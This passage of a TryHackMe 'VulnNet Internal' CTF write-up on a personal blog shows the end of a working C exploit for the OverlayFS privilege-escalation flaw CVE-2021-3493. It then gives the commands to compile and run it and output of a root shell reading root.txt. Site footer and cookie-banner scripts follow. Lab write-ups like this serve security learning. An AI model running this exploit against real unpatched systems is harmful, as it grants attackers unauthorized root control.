buf, sizeof(buf));<br>        if (rd == 0) {<br>            break;<br>        } else if (rd == -1) {<br>            if (errno == EINTR)<br>                continue;<br>            err(1, "read %s", src);<br>        }<br><br>        char *p = buf;<br>        while (rd &gt; 0) {<br>            wr = write(fo, p, rd);<br>            if (wr == -1) {<br>                if (errno == EINTR)<br>                    continue;<br>                err(1, "write %s", dst);<br>            }<br>            p += wr;<br>            rd -= wr;<br>        }<br>    }<br><br>    close(fi);<br>    close(fo);<br>}<br><br>static int exploit()<br>{<br>    char buf[4096];<br><br>    sprintf(buf, "rm -rf '%s/'", DIR_BASE);<br>    system(buf);<br><br>    xmkdir(DIR_BASE, 0777);<br>    xmkdir(DIR_WORK,  0777);<br>    xmkdir(DIR_LOWER, 0777);<br>    xmkdir(DIR_UPPER, 0777);<br>    xmkdir(DIR_MERGE, 0777);<br><br>    uid_t uid = getuid();<br>    gid_t gid = getgid();<br><br>    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)<br>        err(1, "unshare");<br><br>    xwritefile("/proc/self/setgroups", "deny");<br><br>    sprintf(buf, "0 %d 1", uid);<br>    xwritefile("/proc/self/uid_map", buf);<br><br>    sprintf(buf, "0 %d 1", gid);<br>    xwritefile("/proc/self/gid_map", buf);<br><br>    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);<br>    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)<br>        err(1, "mount %s", DIR_MERGE);<br><br>    // all+ep<br>    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";<br><br>    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);<br>    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)<br>        err(1, "setxattr %s", BIN_MERGE);<br><br>    return 0;<br>}<br><br>int main(int argc, char *argv[])<br>{<br>    if (strstr(argv[0], "magic") || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], "shell"))) {<br>        setuid(0);<br>        setgid(0);<br>        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);<br>        err(1, "execl /bin/bash");<br>    }<br><br>    pid_t child = fork();<br>    if (child == -1)<br>        err(1, "fork");<br><br>    if (child == 0) {<br>        _exit(exploit());<br>    } else {<br>        waitpid(child, NULL, 0);<br>    }<br><br>    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);<br>    err(1, "execl %s", BIN_UPPER);<br>}</span></pre><p id="c725" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now save The above code &amp; copy it.</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="d675" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯sys-internal@vulnnet-internal:~$ nano exploit.c<br>/put here the above code<br>//than close nano</span></pre><p id="fc6b" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we need to compile it..</p><blockquote class="abq abr abs"><p id="9781" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Reference — <a class="af rn" href="https://ssd-disclosure.com/wp-content/uploads/2021/04/ubuntu.gif" rel="noopener ugc nofollow" target="_blank">https://ssd-disclosure.com/wp-content/uploads/2021/04/ubuntu.gif</a></p></blockquote><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km ace"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/0*2snuFHyTasNIbC5t.gif 640w, https://miro.medium.com/v2/resize:fit:720/0*2snuFHyTasNIbC5t.gif 720w, https://miro.medium.com/v2/resize:fit:750/0*2snuFHyTasNIbC5t.gif 750w, https://miro.medium.com/v2/resize:fit:786/0*2snuFHyTasNIbC5t.gif 786w, https://miro.medium.com/v2/resize:fit:828/0*2snuFHyTasNIbC5t.gif 828w, https://miro.medium.com/v2/resize:fit:1100/0*2snuFHyTasNIbC5t.gif 1100w, https://miro.medium.com/v2/resize:fit:1400/0*2snuFHyTasNIbC5t.gif 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*2snuFHyTasNIbC5t.gif 640w, https://miro.medium.com/v2/resize:fit:720/0*2snuFHyTasNIbC5t.gif 720w, https://miro.medium.com/v2/resize:fit:750/0*2snuFHyTasNIbC5t.gif 750w, https://miro.medium.com/v2/resize:fit:786/0*2snuFHyTasNIbC5t.gif 786w, https://miro.medium.com/v2/resize:fit:828/0*2snuFHyTasNIbC5t.gif 828w, https://miro.medium.com/v2/resize:fit:1100/0*2snuFHyTasNIbC5t.gif 1100w, https://miro.medium.com/v2/resize:fit:1400/0*2snuFHyTasNIbC5t.gif 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img role="presentation" src="https://miro.medium.com/v2/resize:fit:700/0*2snuFHyTasNIbC5t.gif" alt="" width="700" height="342" loading="lazy" data-is-external-image="true"></figure></div></div></figure><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="2fc3" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯sys-internal@vulnnet-internal:~$ gcc exploit.c -o exploit</span></pre><p id="7a11" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now run the exploit..</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="d96e" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯sys-internal@vulnnet-internal:~$ ./exploit<br>bash-4.4# id<br>uid=1000(sys-internal) gid=1000(sys-internal) euid=0(root) groups=1000(sys-internal),24(cdrom)<br>bash-4.4# cd /root<br>bash-4.4# ls<br>root.txt<br>bash-4.4# cat root.txt |wc -c<br>38<br>bash-4.4#</span></pre><p id="7dfc" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We are root now and a very interesting room is completed!</p><h1 id="e906" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">In this room, we learned about —</h1><ul><li id="e321" class="xw xx tu ly b xy abh ya yb yc abi ye yf abu abj yh yi abv abk yk yl abw abl yn yo yp acj ack acl bj" data-selectable-paragraph="">SMB service enumeration</li><li id="5344" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">RPC Service enumeration</li><li id="2316" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">use of rsync</li><li id="6e01" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">Team service Project and build configuration</li><li id="1ce3" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">CVE-2021–3493 — OverlayFS PE Vulnerability</li></ul><figure class="yq yr ys yt yu yv kl km paragraph-image"><a href="https://www.buymeacoffee.com/sakibulalikhan"></a></figure></div><footer><p class="post__last-updated">This article was updated on August 25, 2023</p><div class="post__tags-share"><ul class="post__tag"><li><a href="https://sakibulalikhan.github.io/tags/ctf-writeup/">CTF Writeups</a></li><li><a href="https://sakibulalikhan.github.io/tags/tryhackme/">Tryhackme</a></li></ul><aside class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsakibulalikhan.github.io%2Ftryhackme-writeup-vulnnet-internal.html" class="js-share facebook" aria-label="Share with Facebook" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#facebook"/></svg> </a><a href="https://twitter.com/share?url=https%3A%2F%2Fsakibulalikhan.github.io%2Ftryhackme-writeup-vulnnet-internal.html&amp;via=%40sakibulalikhan&amp;text=TryHackMe%20Writeup%20%E2%80%94%20VulnNet%20Internal" class="js-share twitter" aria-label="Share with Twitter" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fsakibulalikhan.github.io%2Ftryhackme-writeup-vulnnet-internal.html&amp;media=https%3A%2F%2Fsakibulalikhan.github.io%2Fmedia%2Fposts%2F1%2Fvulnnetinternal.jpg&amp;description=TryHackMe%20Writeup%20%E2%80%94%20VulnNet%20Internal" class="js-share pinterest" aria-label="Share with Pinterest" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#pinterest"/></svg> </a><a href="https://mix.com/add?url=https%3A%2F%2Fsakibulalikhan.github.io%2Ftryhackme-writeup-vulnnet-internal.html" class="js-share mix" aria-label="Share with Mix" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#mix"/></svg> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsakibulalikhan.github.io%2Ftryhackme-writeup-vulnnet-internal.html" class="js-share linkedin" aria-label="Share with LinkedIn" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#linkedin"/></svg> </a><a href="https://buffer.com/add?text=TryHackMe%20Writeup%20%E2%80%94%20VulnNet%20Internal&amp;url=https%3A%2F%2Fsakibulalikhan.github.io%2Ftryhackme-writeup-vulnnet-internal.html" class="js-share buffer" aria-label="Share with Buffer" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#buffer"/></svg> </a><a href="https://api.whatsapp.com/send?text=TryHackMe%20Writeup%20%E2%80%94%20VulnNet%20Internal https%3A%2F%2Fsakibulalikhan.github.io%2Ftryhackme-writeup-vulnnet-internal.html" class="js-share whatsapp" aria-label="Share with WhatsApp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#whatsapp"/></svg></a></aside></div><div class="post__bio bio"><img src="https://sakibulalikhan.github.io/media/website/avatar.jpg" loading="lazy" height="431" width="343" class="bio__avatar" alt="Sakibul Ali Khan"><div><h3 class="h6 bio__name"><a href="https://sakibulalikhan.github.io/authors/sakibulalikhan/" class="invert" title="Sakibul Ali Khan">Sakibul Ali Khan</a></h3><div class="bio__desc"><p>Currently I’m a student and I love computers. I love programming and playing with technology. I am highly interested in cyber security.</p></div></div></div><nav class="post__nav"><div class="post__nav__next"><a class="post__nav__link" href="https://sakibulalikhan.github.io/the-dirty-pipe-vulnerability-on-linux.html" rel="prev">Next Post<h3 class="h6">The Dirty Pipe Vulnerability On Linux</h3></a></div></nav></footer></div></article><div class="comments-area post__inner" id="comments"><div class="comments"><div class="comments-wrapper"><h2>Comments</h2><div id="disqus_thread"></div><noscript>Please enable JS to use the comments form.</noscript><script type="text/javascript">var disqus_config = function () {
							this.page.url = 'https://sakibulalikhan.github.io/tryhackme-writeup-vulnnet-internal.html';
							this.page.identifier = '1'; 
							this.language = 'en_GB';
						};
						
						
				var disqus_element_to_check = document.getElementById('disqus_thread');

				if ('IntersectionObserver' in window) {
					var iObserver = new IntersectionObserver(
						(entries, observer) => {
							entries.forEach(entry => {
								if (entry.intersectionRatio >= 0.1) {
									(function () {
										var d = document, s = d.createElement('script');
										s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
										s.setAttribute('data-timestamp', +new Date());
										(d.head || d.body).appendChild(s);
									})();
									observer.unobserve(entry.target);
								}
							});
						},
						{
							threshold: [0, 0.2, 0.5, 1]
						}
					);

					iObserver.observe(disqus_element_to_check);
				} else {
					(function () {
						var d = document, s = d.createElement('script');
						s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
						s.setAttribute('data-timestamp', +new Date());
						(d.head || d.body).appendChild(s);
					})();
				}</script><script type="text/javascript"></script></div></div></div></div><div class="post__related"><div class="wrapper"><h2 class="h5">Related posts</h2><div class="l-grid l-grid--4"><article class="c-card"><a href="https://sakibulalikhan.github.io/phonebook-htb-web-challenge-writeup.html" class="c-card__image"><img src="https://sakibulalikhan.github.io/media/posts/8/phonebook.jpg" srcset="https://sakibulalikhan.github.io/media/posts/8/responsive/phonebook-xs.jpg 300w, https://sakibulalikhan.github.io/media/posts/8/responsive/phonebook-sm.jpg 480w, https://sakibulalikhan.github.io/media/posts/8/responsive/phonebook-md.jpg 768w, https://sakibulalikhan.github.io/media/posts/8/responsive/phonebook-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="657" width="720" alt="Phonebook — HTB Web Challenge Writeup"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.github.io/tags/hackthebox/">HackTheBox</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.github.io/phonebook-htb-web-challenge-writeup.html" class="invert">Phonebook — HTB Web Challenge Writeup</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:19">August 19, 2023</time><div class="c-card__comments"><a href="https://sakibulalikhan.github.io/phonebook-htb-web-challenge-writeup.html#comments" rel="nofollow" aria-label="Comments"><svg aria-hidden="true"><title>Comments</title><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#comments"/></svg></a></div></footer></div></article><article class="c-card"><a href="https://sakibulalikhan.github.io/templated-htb-web-challenge-writeup.html" class="c-card__image"><img src="https://sakibulalikhan.github.io/media/posts/7/Templated.jpg" srcset="https://sakibulalikhan.github.io/media/posts/7/responsive/Templated-xs.jpg 300w, https://sakibulalikhan.github.io/media/posts/7/responsive/Templated-sm.jpg 480w, https://sakibulalikhan.github.io/media/posts/7/responsive/Templated-md.jpg 768w, https://sakibulalikhan.github.io/media/posts/7/responsive/Templated-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="308" width="720" alt="Templated — HTB Web Challenge Writeup"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.github.io/tags/hackthebox/">HackTheBox</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.github.io/templated-htb-web-challenge-writeup.html" class="invert">Templated — HTB Web Challenge Writeup</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:18">August 19, 2023</time><div class="c-card__comments"><a href="https://sakibulalikhan.github.io/templated-htb-web-challenge-writeup.html#comments" rel="nofollow" aria-label="Comments"><svg aria-hidden="true"><title>Comments</title><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#comments"/></svg></a></div></footer></div></article><article class="c-card"><a href="https://sakibulalikhan.github.io/takeover-tryhackme-writeup.html" class="c-card__image"><img src="https://sakibulalikhan.github.io/media/posts/6/TakeOver.jpg" srcset="https://sakibulalikhan.github.io/media/posts/6/responsive/TakeOver-xs.jpg 300w, https://sakibulalikhan.github.io/media/posts/6/responsive/TakeOver-sm.jpg 480w, https://sakibulalikhan.github.io/media/posts/6/responsive/TakeOver-md.jpg 768w, https://sakibulalikhan.github.io/media/posts/6/responsive/TakeOver-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="512" width="512" alt="TakeOver TryHackMe Writeup"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.github.io/tags/tryhackme/">Tryhackme</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.github.io/takeover-tryhackme-writeup.html" class="invert">TakeOver TryHackMe Writeup</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:17">August 19, 2023</time><div class="c-card__comments"><a href="https://sakibulalikhan.github.io/takeover-tryhackme-writeup.html#comments" rel="nofollow" aria-label="Comments"><svg aria-hidden="true"><title>Comments</title><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#comments"/></svg></a></div></footer></div></article><article class="c-card"><a href="https://sakibulalikhan.github.io/bugged-tryhackme-ctf-writeup.html" class="c-card__image"><img src="https://sakibulalikhan.github.io/media/posts/5/Bugged.jpg" srcset="https://sakibulalikhan.github.io/media/posts/5/responsive/Bugged-xs.jpg 300w, https://sakibulalikhan.github.io/media/posts/5/responsive/Bugged-sm.jpg 480w, https://sakibulalikhan.github.io/media/posts/5/responsive/Bugged-md.jpg 768w, https://sakibulalikhan.github.io/media/posts/5/responsive/Bugged-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="256" width="256" alt="Bugged Tryhackme CTF Writeup"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.github.io/tags/tryhackme/">Tryhackme</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.github.io/bugged-tryhackme-ctf-writeup.html" class="invert">Bugged Tryhackme CTF Writeup</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:15">August 19, 2023</time><div class="c-card__comments"><a href="https://sakibulalikhan.github.io/bugged-tryhackme-ctf-writeup.html#comments" rel="nofollow" aria-label="Comments"><svg aria-hidden="true"><title>Comments</title><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#comments"/></svg></a></div></footer></div></article></div></div></div></main><footer class="footer"><div class="footer__social"><a href="https://twitter.com/sakibulalikhan" aria-label="Twitter" class="twitter"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://github.com/sakibulalikhan" aria-label="Instagram" class="instagram"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#instagram"/></svg> </a><a href="https://www.linkedin.com/in/sakibulalikhan/" aria-label="LinkedIn" class="linkedin"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#linkedin"/></svg></a></div><div class="footer__copyright">Sakibul Ali Khan • 2023 • sakibulalikhan.github.io</div></footer><script>window.publiiThemeMenuConfig = {    
      mobileMenuMode: 'sidebar',
      animationSpeed: 300,
      submenuWidth: 'auto',
      doubleClickTime: 500,
      mobileMenuExpandableSubmenus: true, 
      relatedContainerForOverlayMenuSelector: '.navbar',
   };</script><script defer="defer" src="https://sakibulalikhan.github.io/assets/js/scripts.min.js?v=66112a161d5939d966ce2b20c13988d9"></script><script>var images = document.querySelectorAll('img[loading]');

      for (var i = 0; i < images.length; i++) {
         if (images[i].complete) {
               images[i].classList.add('is-loaded');
         } else {
               images[i].addEventListener('load', function () {
                  this.classList.add('is-loaded');
               }, false);
         }
      }</script><div class="pcb" data-behaviour="badge" data-behaviour-link="#cookie-settings" data-revision="1" data-config-ttl="0" data-debug-mode="false"><div role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="pcb-title" aria-describedby="pcb-txt" class="pcb__banner pcb__banner--left"><div class="pcb__inner"><div id="pcb-title" role="heading" aria-level="2" class="pcb__title">Cookies</div><div id="pcb-txt" class="pcb__txt">This website uses cookies to ensure you get the best experience on our site.</div><div class="pcb__buttons"><button type="button" class="pcb__btn pcb__btn--solid pcb__btn--accept">Ok, I Understand.</button></div></div></div><button class="pcb__badge" aria-label="Cookie Policy" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" width="40" height="40" viewBox="0 0 23 23" fill="currentColor"><path d="M21.41 12.71c-.08-.01-.15 0-.22 0h-.03c-.03 0-.05 0-.08.01-.07 0-.13.01-.19.04-.52.21-1.44.19-2.02-.22-.44-.31-.65-.83-.62-1.53a.758.758 0 0 0-.27-.61.73.73 0 0 0-.65-.14c-1.98.51-3.49.23-4.26-.78-.82-1.08-.73-2.89.24-4.49.14-.23.14-.52 0-.75a.756.756 0 0 0-.67-.36c-.64.03-1.11-.1-1.31-.35-.19-.26-.13-.71-.01-1.29.04-.18.06-.38.03-.59-.05-.4-.4-.7-.81-.66C5.1 1.54 1 6.04 1 11.48 1 17.28 5.75 22 11.6 22c5.02 0 9.39-3.54 10.39-8.42.08-.4-.18-.78-.58-.87Zm-9.81 7.82c-5.03 0-9.12-4.06-9.12-9.06 0-4.34 3.05-8 7.25-8.86-.08.7.05 1.33.42 1.81.24.32.66.67 1.38.84-.76 1.86-.65 3.78.36 5.11.61.81 2.03 2 4.95 1.51.18.96.71 1.54 1.18 1.87.62.43 1.38.62 2.1.62.05 0 .09 0 .13-.01-1.23 3.64-4.7 6.18-8.64 6.18ZM13 17c0 .55-.45 1-1 1s-1-.45-1-1 .45-1 1-1 1 .45 1 1Zm5.29-12.3a.99.99 0 0 1-.29-.71c0-.55.45-.99 1-.99a1 1 0 0 1 .71.3c.19.19.29.44.29.71 0 .55-.45.99-1 .99a1 1 0 0 1-.71-.3ZM9 13.5c0 .83-.67 1.5-1.5 1.5S6 14.33 6 13.5 6.67 12 7.5 12s1.5.67 1.5 1.5Zm3.25.81a.744.744 0 0 1-.06-1.05c.28-.32.75-.34 1.05-.06.31.28.33.75.05 1.06-.15.16-.35.25-.56.25-.18 0-.36-.06-.5-.19ZM8.68 7.26c.41.37.44 1 .07 1.41-.2.22-.47.33-.75.33a.96.96 0 0 1-.67-.26c-.41-.37-.44-1-.07-1.41.37-.42 1-.45 1.41-.08Zm11.48 1.88c.18-.19.52-.19.7 0 .05.04.09.1.11.16.03.06.04.12.04.19 0 .13-.05.26-.15.35-.09.1-.22.15-.35.15s-.26-.05-.35-.15a.355.355 0 0 1-.11-.16.433.433 0 0 1-.04-.19c0-.13.05-.26.15-.35Zm-4.93-1.86a.75.75 0 1 1 1.059-1.06.75.75 0 0 1-1.059 1.06Z"/></svg></button></div><script>(function(win) {
    if (!document.querySelector('.pcb')) {
        return;
    }

    var cbConfig = {
        behaviour: document.querySelector('.pcb').getAttribute('data-behaviour'),
        behaviourLink: document.querySelector('.pcb').getAttribute('data-behaviour-link'),
        revision: document.querySelector('.pcb').getAttribute('data-revision'),
        configTTL: parseInt(document.querySelector('.pcb').getAttribute('data-config-ttl'), 10),
        debugMode: document.querySelector('.pcb').getAttribute('data-debug-mode') === 'true',
        initialState: null,
        previouslyAccepted: []
    };

    var cbUI = {
        wrapper: document.querySelector('.pcb'),
        banner: {
            element: null,
            btnAccept: null,
            btnReject: null,
            btnConfigure: null
        },
        popup: {
            element: null,
            btnClose: null,
            btnSave: null,
            btnAccept: null,
            btnReject: null,
            checkboxes: null,
        },
        overlay: null,
        badge: null,
        blockedScripts: document.querySelectorAll('script[type^="gdpr-blocker/"]'),
        triggerLinks: cbConfig.behaviourLink ? document.querySelectorAll('a[href*="' + cbConfig.behaviourLink + '"]') : null
    };

    function initUI () {
        // setup banner elements
        cbUI.banner.element = cbUI.wrapper.querySelector('.pcb__banner');
        cbUI.banner.btnAccept = cbUI.banner.element.querySelector('.pcb__btn--accept');
        cbUI.banner.btnReject = cbUI.banner.element.querySelector('.pcb__btn--reject');
        cbUI.banner.btnConfigure = cbUI.banner.element.querySelector('.pcb__btn--configure');

        // setup popup elements
        if (cbUI.wrapper.querySelector('.pcb__popup')) {
            cbUI.popup.element = cbUI.wrapper.querySelector('.pcb__popup');
            cbUI.popup.btnClose = cbUI.wrapper.querySelector('.pcb__popup__close');
            cbUI.popup.btnSave = cbUI.popup.element.querySelector('.pcb__btn--save');
            cbUI.popup.btnAccept = cbUI.popup.element.querySelector('.pcb__btn--accept');
            cbUI.popup.btnReject = cbUI.popup.element.querySelector('.pcb__btn--reject');
            cbUI.popup.checkboxes = cbUI.popup.element.querySelector('input[type="checkbox"]');
            // setup overlay
            cbUI.overlay = cbUI.wrapper.querySelector('.pcb__overlay');
        }

        cbUI.badge = cbUI.wrapper.querySelector('.pcb__badge');

        if (cbConfig.behaviour.indexOf('link') > -1) {
            for (var i = 0; i < cbUI.triggerLinks.length; i++) {
                cbUI.triggerLinks[i].addEventListener('click', function(e) {
                    e.preventDefault();
                    showBannerOrPopup();
                });
            }
        }
    }

    function initState () {
        var lsKeyName = getConfigName();
        var currentConfig = localStorage.getItem(lsKeyName);
        var configIsFresh = checkIfConfigIsFresh();

        if (!configIsFresh || currentConfig === null) {
            if (cbConfig.debugMode) {
                console.log('🍪 Config not found, or configuration expired');
            }

            showBanner();
        } else if (typeof currentConfig === 'string') {
            if (cbConfig.debugMode) {
                console.log('🍪 Config founded');
            }

            showBadge();

            if (cbUI.popup.element) {
                var allowedGroups = currentConfig.split(',');
                var checkedCheckboxes = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');

                for (var j = 0; j < checkedCheckboxes.length; j++) {
                    var name = checkedCheckboxes[j].getAttribute('data-group-name');

                    if (name && name !== '-' && allowedGroups.indexOf(name) === -1) {
                        checkedCheckboxes[j].checked = false;
                    }
                }

                for (var i = 0; i < allowedGroups.length; i++) {
                    var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + allowedGroups[i] + '"]');

                    if (checkbox) {
                        checkbox.checked = true;
                    }

                    allowCookieGroup(allowedGroups[i]);
                }
            }
        }

        setTimeout(function () {
            cbConfig.initialState = getInitialStateOfConsents();
        }, 0);
    }

    function checkIfConfigIsFresh () {
        var lastConfigSave = localStorage.getItem('publii-gdpr-cookies-config-save-date');

        if (lastConfigSave === null) {
            return false;
        }

        lastConfigSave = parseInt(lastConfigSave, 10);

        if (lastConfigSave === 0) {
            return true;
        }

        if (+new Date() - lastConfigSave < cbConfig.configTTL * 24 * 60 * 60 * 1000) {
            return true;
        }

        return false;
    }

    function initBannerEvents () {
        cbUI.banner.btnAccept.addEventListener('click', function (e) {
            e.preventDefault();
            acceptAllCookies('banner');
            showBadge();
        }, false);

        if (cbUI.banner.btnReject) {
            cbUI.banner.btnReject.addEventListener('click', function (e) {
                e.preventDefault();
                rejectAllCookies();
                showBadge();
            }, false);
        }

        if (cbUI.banner.btnConfigure) {
            cbUI.banner.btnConfigure.addEventListener('click', function (e) {
                e.preventDefault();
                hideBanner();
                showAdvancedPopup();
                showBadge();
            }, false);
        }
    }

    function initPopupEvents () {
        if (!cbUI.popup.element) {
            return;
        }

        cbUI.overlay.addEventListener('click', function (e) {
            hideAdvancedPopup();
        }, false);

        cbUI.popup.element.addEventListener('click', function (e) {
            e.stopPropagation();
        }, false);

        cbUI.popup.btnAccept.addEventListener('click', function (e) {
            e.preventDefault();
            acceptAllCookies('popup');
        }, false);

        cbUI.popup.btnReject.addEventListener('click', function (e) {
            e.preventDefault();
            rejectAllCookies();
        }, false);

        cbUI.popup.btnSave.addEventListener('click', function (e) {
            e.preventDefault();
            saveConfiguration();
        }, false);

        cbUI.popup.btnClose.addEventListener('click', function (e) {
            e.preventDefault();
            hideAdvancedPopup();
        }, false);
    }

    function initBadgeEvents () {
        if (!cbUI.badge) {
            return;
        }

        cbUI.badge.addEventListener('click', function (e) {
            showBannerOrPopup();
        }, false);
    }

    initUI();
    initState();
    initBannerEvents();
    initPopupEvents();
    initBadgeEvents();

    /**
     * API
     */
    function addScript (src, inline) {
        var newScript = document.createElement('script');

        if (src) {
            newScript.setAttribute('src', src);
        }

        if (inline) {
            newScript.text = inline;
        }

        document.body.appendChild(newScript);
    }

    function allowCookieGroup (allowedGroup) {
        var scripts = document.querySelectorAll('script[type="gdpr-blocker/' + allowedGroup + '"]');
        cbConfig.previouslyAccepted.push(allowedGroup);
    
        for (var j = 0; j < scripts.length; j++) {
            addScript(scripts[j].src, scripts[j].text);
        }

        var groupEvent = new Event('publii-cookie-banner-unblock-' + allowedGroup);
        document.body.dispatchEvent(groupEvent);
        unlockEmbeds(allowedGroup);

        if (cbConfig.debugMode) {
            console.log('🍪 Allowed group: ' + allowedGroup);
        }
    }

    function showBannerOrPopup () {
        if (cbUI.popup.element) {
            showAdvancedPopup();
        } else {
            showBanner();
        }
    }

    function showAdvancedPopup () {
        cbUI.popup.element.classList.add('is-visible');
        cbUI.overlay.classList.add('is-visible');
        cbUI.popup.element.setAttribute('aria-hidden', 'false');
        cbUI.overlay.setAttribute('aria-hidden', 'false');
    }

    function hideAdvancedPopup () {
        cbUI.popup.element.classList.remove('is-visible');
